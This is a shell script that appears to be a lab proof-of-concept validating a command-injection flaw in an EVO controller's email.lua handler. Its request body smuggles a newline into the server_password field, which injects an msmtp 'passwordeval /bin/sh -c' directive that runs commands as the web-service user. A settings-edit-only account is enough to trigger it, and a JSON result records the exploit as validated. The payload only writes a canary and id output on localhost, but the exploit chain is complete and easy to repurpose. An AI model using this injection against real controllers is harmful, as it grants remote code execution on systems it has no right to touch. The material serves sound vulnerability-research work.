#!/bin/sh
set -eu

BASE=http://127.0.0.1:18082/cgi-bin
CANARY=/tmp/evo-email-canary
ID_OUTPUT=/tmp/evo-email-id
RESULT=/tmp/evo-email-result.json
PAYLOAD='server_password=%0Apasswordeval%20/bin/sh%20-c%20%27/bin/busybox%20id%20%3E/tmp/evo-email-id%3Bprintf%20EVO_EMAIL_CANARY%20%3E/tmp/evo-email-canary%27'
EMAIL="lab$(printf '\100')example.com"
AUTH=
SERVER_PID=

cleanup() {
  set +e
  rm -f "$CANARY" "$ID_OUTPUT" /dev/shm/email_test.conf /opt/log/xwebmail.log
  if [ -n "$AUTH" ]; then
    rm -f "/dev/shm/usp_$AUTH"
    rm -rf "/opt/tmp/$AUTH"
  fi
  rm -rf /opt/setup/users/2 /opt/setup/profiles/99
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null
    wait "$SERVER_PID" 2>/dev/null
  fi
}
trap cleanup EXIT INT TERM

post() {
  /bin/busybox wget -qO- --post-data "$1" "$BASE/$2"
}

email_request() {
  post "SSES=$1&recipient=$EMAIL&system_email=$EMAIL&server_address=127.0.0.1&server_port=9&server_auth=1&server_username=lab&$PAYLOAD" email.lua
}

rm -f "$CANARY" "$ID_OUTPUT" "$RESULT" /dev/shm/email_test.conf /opt/log/xwebmail.log
mkdir -p /opt/setup/users/2 /opt/setup/profiles/99
cp /lab/fixtures/email-user-config.json /opt/setup/users/2/config.json
cp /lab/fixtures/email-profile-config.json /opt/setup/profiles/99/config.json
cp /lab/fixtures/email-profile-permissions.json /opt/setup/profiles/99/permissions.json
cp /lab/fixtures/email-profile-layout.json /opt/setup/profiles/99/layout.json
touch /opt/setup/users/2/EmailOnly /opt/setup/profiles/99/EmailOnly
umask 077
/usr/bin/qemu-i386 -L / /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D &
SERVER_PID=$!
for attempt in 1 2 3 4 5 6 7 8 9 10; do
  if /bin/busybox wget -qO- "$BASE/sysinfo.lua" >/dev/null; then
    break
  fi
  sleep 1
done

DENIED=$(email_request '') || true
case "$DENIED" in
  *'"error":"PERMISSION_DENIED"'*) ;;
  *) echo "FAIL no-session control: $DENIED"; exit 1;;
esac
[ ! -e "$CANARY" ] || { echo "FAIL unauthenticated canary executed"; exit 1; }
echo "PASS no-session request denied"

AUTH_RESPONSE=$(post 'action=authenticate&username=EmailOnly&password=emailprobe' api.lua)
case "$AUTH_RESPONSE" in
  *'"status":"ok"'*'"auth":"SSES'*) ;;
  *) echo "FAIL settings-only authentication: $AUTH_RESPONSE"; exit 1;;
esac
AUTH=${AUTH_RESPONSE#*\"auth\":\"}
AUTH=${AUTH%%\"*}
echo "PASS settings-edit-only account authenticated"

TERMINAL=$(post "action=terminal&command=id&auth=$AUTH" debug.lua)
case "$TERMINAL" in
  *'"error":"PERMISSION_DENIED"'*) ;;
  *) echo "FAIL regular account reached Administrator terminal: $TERMINAL"; exit 1;;
esac
echo "PASS Administrator terminal denied"

RESPONSE=$(email_request "$AUTH") || true
echo "email response: $RESPONSE"
[ "$(cat "$CANARY")" = "EVO_EMAIL_CANARY" ] || { echo "FAIL passwordeval canary missing"; exit 1; }
case "$(cat "$ID_OUTPUT")" in
  *'uid=1000'*) ;;
  *) echo "FAIL service-user id output missing: $(cat "$ID_OUTPUT")"; exit 1;;
esac
grep -q '^password $' /dev/shm/email_test.conf
grep -q '^passwordeval /bin/sh -c ' /dev/shm/email_test.conf
echo "PASS genuine msmtp passwordeval executed as the web-service user"

cat >"$RESULT" <<'JSON'
{
  "scope": "Actual EVO 5.8.7 i686 Lighttpd/Lua email.lua and real msmtp 1.8.32 in a network-disabled bubblewrap/QEMU lab",
  "handler_sha256": "398d3fa898b7d4c80012764c0562e6411d3166fb1dbccde2dc0b21f789a5d529",
  "handler_also_identical_to": "EVO 5.8.8 ARM email.lua",
  "regular_user_id": 2,
  "regular_profile_id": 99,
  "sole_permission": "system/settings-edit",
  "no_session_denied": true,
  "administrator_terminal_denied": true,
  "injection_field": "server_password",
  "injected_directive": "passwordeval",
  "canary_content": "EVO_EMAIL_CANARY",
  "command_output": "uid=1000",
  "validated": true,
  "runtime_prerequisite": "email_test.conf must be owner-only; the lab starts Lighttpd with umask 077",
  "limitations": [
    "No physical controller or external network was used",
    "The account and profile are synthetic and the user is not Administrator",
    "The recovered controller package lacks msmtp, so the validated binary is the local msmtp 1.8.32 compatibility runtime",
    "Physical-device msmtp version, umask, process ownership, and reachability remain unverified"
  ]
}
JSON
echo "overall: PASS"
